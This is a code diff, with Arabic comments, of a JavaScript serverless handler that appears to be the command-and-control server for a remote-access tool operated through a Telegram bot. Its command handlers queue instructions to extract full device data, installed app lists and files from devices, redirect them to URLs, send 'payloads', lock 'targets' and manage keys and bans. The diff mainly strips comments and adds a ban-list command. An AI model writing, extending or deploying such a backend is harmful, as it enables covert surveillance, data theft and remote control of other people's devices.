@@ -54,9 +54,6 @@ export default async function handler(req, res) {
   };
 
   try {
-    // ==========================================
-    // 1. مسارات التطبيق (App Endpoints)
-    // ==========================================
     if (type === 'secret') {
       const saved = await kvCmd('GET', 'app_lock_status');
       return res.status(200).send(`"${saved || 'lock'}"`);
@@ -76,10 +73,8 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
-      // === إصلاح مشكل الوقت ===
       if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
         if (Date.now() > keyExpiryTime) {
-          // الوقت سالى، نصيفطو killapp مرة وحدة وكنمسحو الوقت
           keyExpiryTime = 0;
           activeDevice = "";
           await kvCmd('SET', 'is_single_use', '0');
@@ -88,7 +83,7 @@ export default async function handler(req, res) {
       }
       
       const cmd = remoteCommand;
-      remoteCommand = ""; // مسح الأمر باش ما يتنفذش كل مرة
+      remoteCommand = ""; 
       return res.status(200).send(`"${cmd}"`);
     }
 
@@ -139,9 +134,6 @@ export default async function handler(req, res) {
       });
     }
 
-    // ==========================================
-    // 2. التحكم من التيليجرام (Telegram Webhook)
-    // ==========================================
     if (req.method === 'POST' && type === 'telegram_webhook') {
       let body = req.body;
       if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
@@ -172,7 +164,6 @@ export default async function handler(req, res) {
             `🚫 *الحظر:*\n/ban /unban /banall /banlist`); 
           break;
         
-        // === أوامر الوقت (المصححة) ===
         case '/gentime':
           if(args[1]) {
             const minutes = parseInt(args[1]);
@@ -197,7 +188,6 @@ export default async function handler(req, res) {
           } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
           break;
 
-        // === أوامر التحكم ===
         case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
         case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
         case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
@@ -208,19 +198,28 @@ export default async function handler(req, res) {
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
         
-        // === الحالة (مصححة باش تحيد الحظر) ===
         case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
         case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
         case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
         case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "1234"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
         
-        // === الحظر (مصحح) ===
+        // === أوامر الحظر (مصححة ومدموجة) ===
         case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
         case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
         case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
         case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
         
-        // === إحصائيات ===
+        // هنا زدنا banlist
+        case '/banlist': 
+          const bannedRaw = await kvCmd('SMEMBERS', 'banned_devices');
+          const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
+          if (bannedList.length > 0) {
+            await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join('\n')}\``);
+          } else {
+            await sendToTelegram("✅ *No devices are banned.*");
+          }
+          break;
+        
         case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
         case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
